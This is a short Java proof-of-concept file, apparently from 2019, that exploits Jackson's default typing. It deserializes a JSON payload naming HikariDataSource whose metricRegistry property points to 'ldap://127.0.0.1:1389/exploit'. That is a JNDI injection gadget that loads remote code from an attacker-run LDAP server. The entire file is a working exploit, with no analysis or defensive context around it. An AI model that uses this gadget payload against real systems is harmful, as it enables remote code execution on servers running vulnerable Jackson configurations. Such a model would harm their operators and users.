import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/7/31 14:15
 */
public class HikariTest2 {

    public static void main(String[] args){
        String json = "[\"com.zaxxer.hikari.HikariDataSource\",{\"metricRegistry\":\"ldap://127.0.0.1:1389/exploit\"}]";
        try{
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();
            objectMapper.readValue(json,Object.class);
        } catch(IOException e){
            e.printStackTrace();
        }
    }

}
